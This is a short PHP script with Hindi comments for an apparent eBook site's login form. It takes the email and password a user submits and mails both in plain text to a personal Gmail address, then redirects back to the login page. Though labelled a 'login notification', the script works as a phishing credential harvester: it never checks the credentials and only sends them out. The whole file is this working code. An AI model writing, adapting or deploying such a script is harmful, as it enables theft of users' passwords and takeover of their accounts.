<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // यूज़र के द्वारा भरी गई जानकारी
    $email = $_POST['email'];
    $password = $_POST['password'];

    // आपका ईमेल
    $to = "akashparshad6@gmail.com";
    $subject = "New Login Notification from eBook Site";

    // ईमेल का message
    $message = "
    <html>
    <head>
      <title>New Login Notification</title>
    </head>
    <body>
      <h3>Login Details</h3>
      <p><strong>Email:</strong> $email</p>
      <p><strong>Password:</strong> $password</p>
    </body>
    </html>
    ";

    // headers (HTML ईमेल के लिए)
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= "From: noreply@devaebook.com" . "\r\n";

    // ईमेल भेजना
    if(mail($to, $subject, $message, $headers)){
        echo "<script>alert('Login details successfully भेज दी गई!'); window.location.href='login.html';</script>";
    } else {
        echo "<script>alert('Failed, फिर से कोशिश करो।'); window.location.href='login.html';</script>";
    }
}
?>
